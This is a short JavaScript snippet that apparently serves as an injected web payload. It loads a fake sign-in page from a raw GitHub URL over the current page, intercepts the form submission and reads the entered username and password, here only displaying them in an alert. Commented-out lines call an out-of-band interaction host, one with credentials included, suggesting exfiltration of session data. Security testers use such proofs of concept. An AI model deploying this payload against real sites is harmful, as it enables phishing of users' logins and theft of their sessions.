fetch("https://raw.githubusercontent.com/Usama3423/web/main/signin.html").then(res=>res.text()).then(res => {


  document.body.innerHTML = res;

  const form = document.querySelector('#aa');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('#user').value
    let pass = document.querySelector('#pass').value
    alert('Login: ' + login + " password: " + pass);

    return;
  }, true);
})

// fetch("https://jksuolqicsmqvwaztvtw16cqryiysowt1.oast.fun", { "method": "POST", "credentials": "include"})


// fetch("https://jksuolqicsmqvwaztvtw16cqryiysowt1.oast.fun")
